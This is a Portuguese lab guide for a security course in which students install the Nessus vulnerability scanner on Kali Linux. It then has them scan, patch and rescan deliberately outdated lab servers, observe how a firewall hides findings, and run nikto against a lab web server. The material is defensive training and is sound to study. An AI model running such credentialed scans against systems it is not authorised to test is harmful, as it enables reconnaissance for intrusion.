<p>Nesta atividade iremos instalar e configurar o Tenable Nessus (<a href="https://www.tenable.com/products/nessus-home" class="bare">https://www.tenable.com/products/nessus-home</a>), um <em>scanner</em> de vulnerabilidades desenvolvido pela Tenable Network Security. O projeto era <em>open source</em> até a versão 2.2.11, em 2005, quando foi lançada a versão 3 do Nessus <em>engine</em> e ele se tornou, então, proprietário. O software ainda é gratuito para um bom número de usos, excluindo-se testes de <em>compliance</em> (como PCI, CIS e FDCC), auditorias de rede e checagens mais recentes, bem como algumas outras características.</p>
</div>
<div class="paragraph">
<p>O OpenVAS (<a href="http://www.openvas.org/" class="bare">http://www.openvas.org/</a>) é um <em>fork</em> <em>open source</em> bastante popular do Nessus, que vem inclusive pré-instalado na distribuição Kali Linux.</p>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Com a máquina <em>KaliLinux-G</em> <strong>desligada</strong>, acesse o menu <em>Settings</em> &gt; <em>Storage</em>, clique na linha da controladora SATA e depois no pequeno símbolo de um HD com um <code>+</code> verde. Iremos adicionar um novo disco de 30 GB para armazenar a instalação do Nessus, já que o disco atual, de 20 GB, não será suficiente. Após clicar no ícone:</p>
<div class="openblock">
<div class="content">
<div class="ulist">
<ul>
<li>
<p>Selecione <em>Create new disk</em>.</p>
</li>
<li>
<p>Tipo do arquivo: mantenha <em>VDI</em>.</p>
</li>
<li>
<p>Tipo de alocação: mantenha <em>Dynamically allocated</em>.</p>
</li>
<li>
<p>Nome do disco: <code>kali-nessus</code></p>
</li>
<li>
<p>Tamanho do disco: 30 GB</p>
</li>
</ul>
</div>
</div>
</div>
<div class="paragraph">
<p>Além disso, será necessário voltar a máquina <em>KaliLinux-G</em> para a DMZ. Acesse <em>Settings</em> &gt; <em>Network</em> e mude o nome do adaptador <em>host-only</em> da VM para o mesmo das máquinas <em>LinServer-G</em> e <em>WinServer-G</em>.</p>
</div>
<div class="paragraph">
<p>Ao final do processo, ligue a máquina <em>KaliLinux-G</em>.</p>
</div>
</li>
<li>
<p>Após o <em>boot</em>, faça login como usuário <code>root</code> e abra um terminal. Vamos particionar, formatar e montar o disco adicionado. Primeiro, descubra a letra sob a qual o disco foi detectado:</p>
<div class="literalblock">
<div class="content">
<pre># dmesg | grep -i 'Attached SCSI disk'
[    1.828729] sd 1:0:0:0: [sdb] Attached SCSI disk
[    1.856784] sd 0:0:0:0: [sda] Attached SCSI disk</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># fdisk -l /dev/sdb
Disk /dev/sdb: 30 GiB, 32212254720 bytes, 62914560 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes</pre>
</div>
</div>
<div class="paragraph">
<p>Como era de se esperar, o disco foi detectado como <code>/dev/sdb</code>. Particione-o usando o <code>fdisk</code>: crie uma única partição primária, ocupando a totalidade do disco, com tipo de sistema de arquivos <code>Linux</code>.</p>
</div>
<div class="literalblock">
<div class="content">
<pre># fdisk /dev/sdb

Welcome to fdisk (util-linux 2.31.1).
Changes will remain in memory only, until you decide to write them.
Be careful before using the write command.

Device does not contain a recognized partition table.
Created a new DOS disklabel with disk identifier 0x986bc0aa.</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>Command (m for help): o
Created a new DOS disklabel with disk identifier 0xc0163032.</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>Command (m for help): n
Partition type
   p   primary (0 primary, 0 extended, 4 free)
   e   extended (container for logical partitions)
Select (default p):

Using default response p.
Partition number (1-4, default 1):
First sector (2048-62914559, default 2048):
Last sector, +sectors or +size{K,M,G,T,P} (2048-62914559, default 62914559):

Created a new partition 1 of type 'Linux' and of size 30 GiB.</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>Command (m for help): w
The partition table has been altered.
Calling ioctl() to re-read partition table.
Syncing disks.</pre>
</div>
</div>
<div class="paragraph">
<p>Agora, formate o disco com o sistema de arquivos <code>ext4</code>:</p>
</div>
<div class="literalblock">
<div class="content">
<pre># mkfs.ext4 /dev/sdb1
mke2fs 1.44.1 (24-Mar-2018)
Creating filesystem with 7864064 4k blocks and 1966080 inodes
Filesystem UUID: 99654695-1f56-4521-8cd5-da0c533b11ae
Superblock backups stored on blocks:
	32768, 98304, 163840, 229376, 294912, 819200, 884736, 1605632, 2654208,
	4096000

Allocating group tables: done
Writing inode tables: done
Creating journal (32768 blocks): done
Writing superblocks and filesystem accounting information: done</pre>
</div>
</div>
<div class="paragraph">
<p>Iremos montar essa partição no <code>/opt</code>. Primeiro, monte-a temporariamente no diretório <code>/mnt</code> e faça o <em>backup</em> dos dados preexistentes no <code>/opt</code> para dentro dela, depois desfaça o <em>mount</em> temporário.</p>
</div>
<div class="literalblock">
<div class="content">
<pre># mount /dev/sdb1 /mnt/</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># rsync -av /opt/ /mnt/</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># umount /mnt/</pre>
</div>
</div>
<div class="paragraph">
<p>Descubra qual o UUID (<em>Universally Unique Identifier</em>) dessa nova partição. Em seguida, usando esse dado, crie uma nova linha no <code>/etc/fstab</code> que monte a partição automaticamente no diretório <code>/opt</code> durante o <em>boot</em>. Finalmente, monte-a usando <code>mount -a</code> e verifique o funcionamento da sua configuração.</p>
</div>
<div class="literalblock">
<div class="content">
<pre># blkid | grep '^/dev/sdb1' | cut -d' ' -f2 | sed 's/"//g'
UUID=99654695-1f56-4521-8cd5-da0c533b11ae</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># uuid=$( blkid | grep '^/dev/sdb1' | cut -d' ' -f2 | sed 's/"//g' ); echo "$uuid   /opt   ext4   defaults   0   2" &gt;&gt; /etc/fstab; unset uuid</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># tail -n1 /etc/fstab
UUID=99654695-1f56-4521-8cd5-da0c533b11ae   /opt   ext4   defaults   0   2</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># mount -a</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># mount | grep '^/dev/sdb1 '
/dev/sdb1 on /opt type ext4 (rw,relatime)</pre>
</div>
</div>
</li>
<li>
<p>Vamos reconfigurar a rede da máquina <em>KaliLinux-G</em> para a DMZ. Edite o arquivo <code>/etc/network/interfaces</code> como se segue:</p>
<div class="literalblock">
<div class="content">
<pre># nano /etc/network/interfaces
(...)</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># cat /etc/network/interfaces
source /etc/network/interfaces.d/*

auto lo
iface lo inet loopback

auto eth0
iface eth0 inet static
address 172.16.1.30/24
gateway 172.16.1.1</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># systemctl restart networking</pre>
</div>
</div>
</li>
<li>
<p>O próximo passo é fazer o download do pacote do Nessus. Na máquina <em>KaliLinux-G</em>, acesse a URL <a href="https://www.tenable.com/products/nessus-home" class="bare">https://www.tenable.com/products/nessus-home</a> com o navegador Firefox. À direita da página, preencha a caixa <em>Register for an Activation Code</em>; não se esqueça de usar um endereço de e-mail válido. Em seguida, clique no botão <em>Download</em>.</p>
</li>
<li>
<p>Na nova página, baixe o pacote <code>Nessus-x.y.z-debian6_amd64.deb</code> (ajuste os valores de <code>x.y.z</code> para a versão exibida pela página). Essa versão também é indicada para o Kali Linux AMD64, que é a distribuição que estamos usando na máquina <em>KaliLinux-G</em>. Concorde com o termo de licença, e salve o pacote <code>.deb</code>&#8201;&#8212;&#8201;não o instale ainda.</p>
</li>
<li>
<p>No seu endereço de e-mail, cheque por uma nova mensagem com o título <em>Tenable Nessus Home Activation Code</em>. Após o cabeçalho <strong><em>Activating Your Nessus Home Subscription</em></strong>, o código de 20 caracteres para ativação do seu <em>scanner</em> será informado. Guarde este código para uso futuro.</p>
</li>
<li>
<p>Agora sim, vamos instalar o Nessus. O arquivo provavelmente foi baixado para a pasta <code>/root/Downloads</code>, como se segue:</p>
<div class="literalblock">
<div class="content">
<pre># pwd
/root/Downloads</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># ls
Nessus-7.1.3-debian6_amd64.deb</pre>
</div>
</div>
<div class="paragraph">
<p>Instale-o usando o comando <code>dpkg</code>:</p>
</div>
<div class="literalblock">
<div class="content">
<pre># dpkg -i Nessus-7.1.3-debian6_amd64.deb</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>Selecting previously unselected package nessus.
(Reading database ... 356069 files and directories currently installed.)
Preparing to unpack Nessus-7.1.3-debian6_amd64.deb ...
Unpacking nessus (7.1.3) ...
Setting up nessus (7.1.3) ...
Unpacking Nessus Core Components...

 - You can start Nessus by typing /etc/init.d/nessusd start
 - Then go to https://KaliLinux-A:8834/ to configure your scanner

Processing triggers for systemd (238-4) ...</pre>
</div>
</div>
<div class="paragraph">
<p>Siga as instruções de instalação, e inicie o Nessus com o comando:</p>
</div>
<div class="literalblock">
<div class="content">
<pre># /etc/init.d/nessusd start</pre>
</div>
</div>
</li>
<li>
<p>Abra o navegador Firefox e acesse a URL <a href="https://127.0.0.1:8834/" class="bare">https://127.0.0.1:8834/</a> (se preferir, acesse de sua máquina física no endereço <a href="https://172.16.G.30:8834" class="bare">https://172.16.G.30:8834</a>) para entrar na console administrativa do Nessus. Adicione uma exceção de segurança para o certificado HTTPS auto-assinado do Nessus, e prossiga.</p>
<div class="paragraph">
<p>Na tela de criação de usuário, informe o <em>username</em> <code>admin</code> e senha <code>rnpesr</code>, e clique em <em>Continue</em>.</p>
</div>
<div class="paragraph">
<p>Na tela subsequente, mantenha o <em>Scanner Type</em> em <em>Home, Professional or Manager</em>, e no campo <em>Activation Code</em> informe o código recebido por e-mail no passo (5) desta atividade. Clique em <em>Continue</em> e aguarde a inicialização do Nessus (esse passo pode demorar, seja paciente).</p>
</div>
</li>
<li>
<p>Ao final do processo, você terá acesso à console principal do Nessus, como mostrado na imagem abaixo.</p>
<div id="img-nessus-console" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/nessus-console.png" alt="nessus console">
</div>
<div class="title">Figure 85. Console do Nessus</div>
</div>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_2_realizando_um_scan_em_so_linux">2) Realizando um <strong><em>scan</em></strong> em SO Linux</h3>
<div class="admonitionblock warning">
<table>
<tr>
<td class="icon">
<i class="fa icon-warning" title="Warning"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Esta atividade será realizada nas máquinas virtuais <em>KaliLinux-G</em> e <em>LinServer-G-Debian8</em>.</p>
</div>
</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>Desligue a máquina <em>LinServer-G</em>, se estiver ligada. Em seu lugar, suba a máquina <em>LinServer-G-Debian8</em>, que é uma máquina Debian Linux 8 propositalmente desatualizada que utilizaremos nesta atividade. Configure a rede de forma idêntica à máquina <em>LinServer-G</em>, com as seguintes interfaces:</p>
</div>
<div class="openblock">
<div class="content">
<div class="ulist">
<ul>
<li>
<p><code>eth0</code>: conectada à rede <code>DMZ</code> com endereço IP 172.16.G.10/24.</p>
</li>
</ul>
</div>
</div>
</div>
<div class="paragraph">
<p>Feito isso, vamos realizar um <em>scan</em> na máquina <em>LinServer-G-Debian8</em>, verificar as vulnerabilidades identificadas e tentar corrigi-las através da atualização do sistema.</p>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Na console principal do Nessus, clique em <em>Create a new scan</em>. Na tela seguinte, selecione o <em>template</em> <em>Basic Network Scan</em>.</p>
</li>
<li>
<p>Em <em>Settings</em> &gt; <em>General</em>, configure:</p>
<div class="openblock">
<div class="content">
<div class="ulist">
<ul>
<li>
<p><em>Name</em>: <em>LinServer-G-Debian8</em></p>
</li>
<li>
<p><em>Description</em>: <em>Scan</em> da máquina <em>LinServer-G-Debian8</em></p>
</li>
<li>
<p><em>Targets</em>: 172.16.G.10/32</p>
</li>
</ul>
</div>
</div>
</div>
</li>
<li>
<p>Em <em>Credentials</em> &gt; <em>SSH</em>, configure:</p>
<div class="openblock">
<div class="content">
<div class="ulist">
<ul>
<li>
<p><em>Authentication method</em>: <em>password</em></p>
</li>
<li>
<p><em>Username</em>: aluno</p>
</li>
<li>
<p><em>Password (unsafe!)</em>: <code>rnpesr</code></p>
</li>
<li>
<p><em>Elevate privileges with</em>: <code>su</code></p>
</li>
<li>
<p><em>su login</em>: <code>root</code></p>
</li>
<li>
<p><em>Escalation password</em>: <code>rnpesr</code></p>
</li>
<li>
<p><em>Location of su (directory)</em>: <code>/bin</code></p>
</li>
</ul>
</div>
</div>
</div>
</li>
<li>
<p>Clique em <em>Save</em>. Na tela seguinte, clique no ícone <em>Launch</em> (que parece um pequeno <em>play</em>) na parte à direita da tela. O <em>scan</em> será iniciado, como mostrado abaixo.</p>
<div id="img-nessus-linserver1" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/nessus-linserver1.png" alt="nessus linserver1">
</div>
<div class="title">Figure 86. Scan inicial do LinServer-G-Debian8 no Nessus</div>
</div>
<div class="paragraph">
<p>Aguarde o final do <em>scan</em>, e confira o resultado. Se quiser acompanhar o <em>scan</em> enquanto ele é realizado, clique na linha para expandi-la.</p>
</div>
</li>
<li>
<p>Após a conclusão do <em>scan</em>, cheque a página de resultados, como mostrado abaixo.</p>
<div id="img-nessus-linserver2" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/nessus-linserver2.png" alt="nessus linserver2">
</div>
<div class="title">Figure 87. Primeiro scan do LinServer-G-Debian8 no Nessus</div>
</div>
<div class="paragraph">
<p>Veja que há um grande número de vulnerabilidades identificadas: 6 críticas, 43 de alto impacto, 34 de médio impacto, 4 de baixo impacto e 48 de cunho informativo. Entre na aba <em>Vulnerabilities</em> e explore algumas dessas vulnerabilidades&#8201;&#8212;&#8201;por exemplo, confira abaixo a vulnerabilidade DSA-3481-1, referente à <code>glibc</code>:</p>
</div>
<div id="img-nessus-linserver3" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/nessus-linserver3.png" alt="nessus linserver3">
</div>
<div class="title">Figure 88. Vulnerabilidade crítica da glibc</div>
</div>
<div class="paragraph">
<p>O Nessus apresenta várias informações úteis, como a natureza da vulnerabilidade, quais CVEs (<em>Common Vulnerabilities and Exposures</em>) são relevantes, e quais são as soluções mais indicadas. Do ponto de vista de gestão de riscos e vulnerabilidades em um parque com um grande número de máquinas instaladas, essas informações são importantíssimas.</p>
</div>
</li>
<li>
<p>Vamos tentar corrigir algumas (ou, idealmente, todas) dessas vulnerabilidades. Entre na máquina <em>LinServer-G-Debian8</em> e faça uma atualização completa do sistema. Em seguida, reinicie a VM.</p>
<div class="literalblock">
<div class="content">
<pre># hostname
LinServer-A</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># apt-get update</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># apt-get dist-upgrade -y</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># reboot</pre>
</div>
</div>
</li>
<li>
<p>De volta à console do Nessus, rode novamente o <em>scan</em> criado nos passos [1-3]. Ao final, confira seus resultados:</p>
<div id="img-nessus-linserver4" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/nessus-linserver4.png" alt="nessus linserver4">
</div>
<div class="title">Figure 89. Scan do LinServer-G-Debian8 após atualização</div>
</div>
<div class="paragraph">
<p>Temos uma melhora notável: apenas 1 vulnerabilidade crítica e 3 de alto impacto foram identificadas, um cenário muito menos preocupante que o que tínhamos anteriormente.</p>
</div>
<div class="paragraph">
<p>Agora, cabe ao analista de segurança analisar cuidadosamente cada uma dessas 4 vulnerabilidades remanescentes, e determinar qual o melhor caminho a tomar para mitigá-las. Certamente, um trabalho muito mais fácil e exequível do que o que tínhamos à nossa frente antes da atualização do sistema.</p>
</div>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_3_realizando_um_scan_em_so_windows">3) Realizando um <strong><em>scan</em></strong> em SO Windows</h3>
<div class="admonitionblock warning">
<table>
<tr>
<td class="icon">
<i class="fa icon-warning" title="Warning"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Esta atividade será realizada nas máquinas virtuais <em>KaliLinux-G</em> e <em>WinServer-G</em>.</p>
</div>
</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>Vamos agora realizar um <em>scan</em> na máquina <em>WinServer-G</em>, verificar as vulnerabilidades identificadas e tentar corrigi-las via atualizações e configurações de <em>hardening</em>. Antes de começar, verifique que a máquina <em>WinServer-G</em> está ligada e acessível.</p>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Na console principal do Nessus, clique em <em>Create a new scan</em>. Na tela seguinte, selecione o <em>template</em> <em>Basic Network Scan</em>.</p>
</li>
<li>
<p>Em <em>Settings</em> &gt; <em>General</em>, configure:</p>
<div class="openblock">
<div class="content">
<div class="ulist">
<ul>
<li>
<p><em>Name</em>: <em>WinServer-G</em></p>
</li>
<li>
<p><em>Description</em>: <em>Scan</em> da máquina <em>WinServer-G</em></p>
</li>
<li>
<p><em>Targets</em>: 172.16.G.20/32</p>
</li>
</ul>
</div>
</div>
</div>
</li>
<li>
<p>Em <em>Credentials</em> &gt; <em>Windows</em>, configure:</p>
<div class="openblock">
<div class="content">
<div class="ulist">
<ul>
<li>
<p><em>Authentication method</em>: <em>Password</em></p>
</li>
<li>
<p><em>Username</em>: <code>Administrator</code></p>
</li>
<li>
<p><em>Password</em>: <code>rnpesr</code></p>
</li>
<li>
<p><em>Domain</em>: mantenha vazio</p>
</li>
</ul>
</div>
</div>
</div>
</li>
<li>
<p>Clique em <em>Save</em>. Na tela seguinte, clique no ícone <em>Launch</em> (que parece um pequeno <em>play</em>) na parte à direita da tela. O <em>scan</em> será iniciado, como anteriormente. Após a conclusão do <em>scan</em>, cheque a página de resultados, como mostrado abaixo.</p>
<div id="img-nessus-winserver1" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/nessus-winserver1.png" alt="nessus winserver1">
</div>
<div class="title">Figure 90. Primeiro scan do WinServer-G no Nessus</div>
</div>
<div class="paragraph">
<p>Veja que há um enorme número de vulnerabilidades identificadas: 25 críticas, 327 de alto impacto, 81 de médio impacto, 7 de baixo impacto e 159 de cunho informativo. Entre na aba <em>Vulnerabilities</em> e explore algumas dessas vulnerabilidades.</p>
</div>
</li>
<li>
<p>Vamos tentar corrigir algumas dessas vulnerabilidades. Entre na máquina <em>WinServer-G</em> e faça o download da ferramenta <em>Microft Baseline Security Analyzer</em>, em idioma inglês para máquinas x86 (disponível em <a href="https://www.microsoft.com/en-us/download/details.aspx?id=7558" class="bare">https://www.microsoft.com/en-us/download/details.aspx?id=7558</a> ). Se preferir, faça o download na sua máquina física e copie o instalador através da pasta compartilhada pelo Virtualbox.</p>
<div class="paragraph">
<p>Na instalação do MBSA, aceite todas as opções padrão do instalador. Em seguida, inicie a ferramenta e selecione a opção <em>Scan a computer</em>. Não altere nenhuma das opções padrão e clique em <em>Start Scan</em>. O <em>scan</em> será iniciado, como mostrado abaixo:</p>
</div>
<div id="img-nessus-winserver2" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/nessus-winserver2.png" alt="nessus winserver2">
</div>
<div class="title">Figure 91. Scan do MBSA na máquina WinServer-G</div>
</div>
<div class="paragraph">
<p>Após o final do <em>scan</em>, vários apontamentos serão indicados pelo MBSA, como se segue:</p>
</div>
<div id="img-nessus-winserver3" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/nessus-winserver3.png" alt="nessus winserver3">
</div>
<div class="title">Figure 92. Resultados do scan do MBSA na máquina WinServer-G</div>
</div>
<div class="paragraph">
<p>Desses, o mais preocupante é de longe o grande número de atualizações de segurança pendentes: 205. Ainda há alertas quanto à falta de atualizações automáticas, expiração de senhas de usuários e situação do <em>Windows Firewall</em>.</p>
</div>
</li>
<li>
<p>Seguindo as recomendações do MBSA, ative as atualizações automáticas e faça a atualização completa da máquina <em>WinServer-G</em>. Como esperado, esse passo pode demorar um pouco, então seja paciente.</p>
<div id="img-nessus-winserver4" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/nessus-winserver4.png" alt="nessus winserver4">
</div>
<div class="title">Figure 93. WinServer-G atualizado</div>
</div>
<div class="paragraph">
<p>Após o final do processo, a tela do <em>Windows Update</em> deve mostrar a mensagem acima.</p>
</div>
</li>
<li>
<p>Rode novamente o <em>scan</em> do Nessus na máquina <em>WinServer-G</em> e verifique os resultados.</p>
<div id="img-nessus-winserver5" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/nessus-winserver5.png" alt="nessus winserver5">
</div>
<div class="title">Figure 94. Scan final do WinServer-G no Nessus</div>
</div>
<div class="paragraph">
<p>A diferença para o panorama anterior é significativa: agora temos apenas 7 vulnerabilidades de médio impacto, 2 de baixo impacto e 27 de cunho informativo. De fato, as recomendações do MBSA e as atualizações de sistema fizeram uma diferença importante na segurança do sistema.</p>
</div>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_4_efeitos_do_firewall_em_um_scan">4) Efeitos do firewall em um <strong><em>scan</em></strong></h3>
<div class="admonitionblock warning">
<table>
<tr>
<td class="icon">
<i class="fa icon-warning" title="Warning"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Esta atividade será realizada nas máquinas virtuais <em>KaliLinux-G</em> e <em>FWGW1-G-Debian8</em>.</p>
</div>
</td>
</tr>
</table>
</div>
<div class="paragraph">
<p>Desligue a máquina <em>FWGW1-G</em>, se estiver ligada. Em seu lugar, suba a máquina <em>FWGW1-G-Debian8</em>, que é uma máquina Debian Linux 8 propositalmente desatualizada que utilizaremos nesta atividade. Configure a rede de forma idêntica à máquina <em>FWGW1-G</em>, com as seguintes interfaces de rede:</p>
</div>
<div class="openblock">
<div class="content">
<div class="ulist">
<ul>
<li>
<p><code>eth0</code>: conectada via <em>bridge</em> à rede externa, em modo DHCP.</p>
</li>
<li>
<p><code>eth1</code>: conectada à rede <code>DMZ</code> com endereço IP 172.16.G.10/24.</p>
</li>
<li>
<p><code>eth2</code>: conectada à rede <code>Intranet</code>, com endereço IP 10.1.G.1/24.</p>
</li>
</ul>
</div>
</div>
</div>
<div class="paragraph">
<p>Realize a configuração de repasse de pacotes e de firewall de forma idêntica ao que fizemos na sessão 3. Instale o pacote <code>iptables-persistent</code> e utilize como referência o arquivo <code>/etc/iptables/rules.v4</code> da sua máquina <em>FWGW1-G</em>, que pode ser copiado de forma direta&#8201;&#8212;&#8201;lembre-se apenas de substituir as ocorrências da interface <code>enp0s3</code> por <code>eth0</code>, dada a diferença de nomenclatura no Debian 8.</p>
</div>
<div class="paragraph">
<p>Vamos agora realizar um <em>scan</em> na máquina <em>FWGW1-G-Debian8</em>. Lembre-se, no entanto, que o firewall interno (especificamente, da <em>chain</em> INPUT da tabela <em>filter</em>) é bastante restritivo. Qual será o efeito desse elemento em um <em>scan</em> do Nessus?</p>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Na console principal do Nessus, clique em <em>Create a new scan</em>. Na tela seguinte, selecione o <em>template</em> <em>Basic Network Scan</em>.</p>
</li>
<li>
<p>Em <em>Settings</em> &gt; <em>General</em>, configure:</p>
<div class="openblock">
<div class="content">
<div class="ulist">
<ul>
<li>
<p><em>Name</em>: <em>FWGW1-G-Debian8</em></p>
</li>
<li>
<p><em>Description</em>: <em>Scan</em> da máquina <em>FWGW1-G-Debian8</em></p>
</li>
<li>
<p><em>Targets</em>: 172.16.G.1/32</p>
</li>
</ul>
</div>
</div>
</div>
</li>
<li>
<p>Não iremos adicionar login via <code>ssh</code> para este <em>scan</em>, por dois motivos: primeiro, queremos testar o impacto das proteções de rede que empregamos na efetividade do <em>scan</em> e, segundo, porque não há regra que permita logins <code>ssh</code> oriundos da rede 172.16.G.0/24.</p>
</li>
<li>
<p>Clique em <em>Save</em>. Em seguida, clique no ícone <em>Launch</em> (que parece um pequeno <em>play</em>) na parte à direita da tela. O <em>scan</em> será iniciado, como anteriormente. Após a conclusão do <em>scan</em>, cheque a página de resultados, como mostrado abaixo.</p>
<div id="img-nessus-fwgw1" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/nessus-fwgw1.png" alt="nessus fwgw1">
</div>
<div class="title">Figure 95. Primeiro scan do FWGW1-G-Debian8 no Nessus</div>
</div>
<div class="paragraph">
<p>Um resultado impressionante: apenas 6 vulnerabilidades informativas. Mas, será mesmo?</p>
</div>
</li>
<li>
<p>Limpe as configurações de firewall da máquina <em>FWGW1-G-Debian8</em>, permitindo todo tipo de conexão externa. Em seguida, rode o <em>scan</em> novamente.</p>
<div class="literalblock">
<div class="content">
<pre># iptables -P INPUT ACCEPT</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># iptables -P FORWARD ACCEPT</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># iptables -F</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># iptables -L -vn
Chain INPUT (policy ACCEPT 55 packets, 6971 bytes)
 pkts bytes target     prot opt in     out     source               destination

Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination

Chain OUTPUT (policy ACCEPT 20 packets, 1568 bytes)
 pkts bytes target     prot opt in     out     source               destination</pre>
</div>
</div>
<div class="paragraph">
<p>Feito isso, clique novamente no botão <em>Launch</em> para iniciar um novo <em>scan</em>. Após o final do processo, temos o seguinte resultado:</p>
</div>
<div id="img-nessus-fwgw2" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/nessus-fwgw2.png" alt="nessus fwgw2">
</div>
<div class="title">Figure 96. Segundo scan do FWGW1-G-Debian8 no Nessus</div>
</div>
<div class="paragraph">
<p>Agora temos uma vulnerabilidade de alto impacto, duas de médio impacto e 23 informativas. Talvez o servidor não esteja tão seguro quando imaginávamos&#8230;&#8203; vamos tentar ir mais a fundo.</p>
</div>
</li>
<li>
<p>Dentro do <em>scan</em> do <em>FWGW1-G-Debian8</em>, clique em <em>Configure</em>. Em <em>Credentials</em> &gt; <em>SSH</em>, configure:</p>
<div class="openblock">
<div class="content">
<div class="ulist">
<ul>
<li>
<p><em>Authentication method</em>: <em>password</em></p>
</li>
<li>
<p><em>Username</em>: aluno</p>
</li>
<li>
<p><em>Password (unsafe!)</em>: <code>rnpesr</code></p>
</li>
<li>
<p><em>Elevate privileges with</em>: <code>su</code></p>
</li>
<li>
<p><em>su login</em>: <code>root</code></p>
</li>
<li>
<p><em>Escalation password</em>: <code>rnpesr</code></p>
</li>
<li>
<p><em>Location of su (directory)</em>: <code>/bin</code></p>
</li>
</ul>
</div>
</div>
</div>
<div class="paragraph">
<p>Clique em <em>Save</em>, e rode o <em>scan</em> uma terceira vez. Como ficou o resultado do <em>scan</em>?</p>
</div>
<div id="img-nessus-fwgw3" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/nessus-fwgw3.png" alt="nessus fwgw3">
</div>
<div class="title">Figure 97. Scan final do FWGW1-G-Debian8 no Nessus</div>
</div>
<div class="paragraph">
<p>Com o login <code>ssh</code> ativado, o Nessus conseguiu, agora sim, encontrar 6 vulnerabilidades críticas, 44 de alto impacto, 36 de médio impacto, 4 de baixo impacto e 54 informativas. De fato, a segurança do servidor <em>FWGW1-G-Debian8</em> está no mesmo patamar da máquina <em>LinServer-G-Debian8</em> antes da sua atualização, o que seria esperado.</p>
</div>
<div class="paragraph">
<p>Esse exercício serve para visualizarmos um fato relevante: firewalls podem mascarar problemas de segurança, que ficam latentes até que um atacante descubra um método de aproveitar-se delas. Sempre que for rodar ferramentas de análise de vulnerabilidades automatizadas em sua rede, lembre-se de criar regras de liberação relevantes nos firewalls para visualizar a real situação do seu parque.</p>
</div>
</li>
<li>
<p>Atualize a máquina <em>FWGW1-G-Debian8</em> e rode o <em>scan</em> novamente, nos mesmos moldes que fizemos com o <em>LinServer-G-Debian8</em>. Houve melhora significativa?</p>
</li>
<li>
<p>Finalmente, desligue a máquina <em>FWGW1-G-Debian8</em> e religue a máquina <em>FWGW1-G</em>. Faça o mesmo com as máquinas <em>LinServer-G-Debian8</em> e <em>LinServer-G</em>.</p>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_5_auditoria_de_servidores_web">5) Auditoria de servidores web</h3>
<div class="admonitionblock warning">
<table>
<tr>
<td class="icon">
<i class="fa icon-warning" title="Warning"></i>
</td>
<td class="content">
<div class="paragraph">
<p>Esta atividade será realizada nas máquinas virtuais <em>KaliLinux-G</em>, <em>LinServer-G</em> e <em>WinServer-G</em>.</p>
</div>
</td>
</tr>
</table>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Na máquina <em>KaliLinux-G</em>, execute a ferramenta <code>nikto</code> buscando por vulnerabilidades no servidor web Apache instalado na máquina <em>LinServer-G</em>.</p>
<div class="literalblock">
<div class="content">
<pre># nikto -host 172.16.1.10 -C all
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          172.16.1.10
+ Target Hostname:    172.16.1.10
+ Target Port:        80
+ Start Time:         2018-10-16 12:18:17 (GMT-3)
---------------------------------------------------------------------------
+ Server: Apache/2.4.25 (Debian)
+ Server leaks inodes via ETags, header found with file /, fields: 0x29cd 0x577f7e7da950c
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
+ OSVDB-3233: /icons/README: Apache default file found.
+ 26165 requests: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2018-10-16 12:18:46 (GMT-3) (29 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested</pre>
</div>
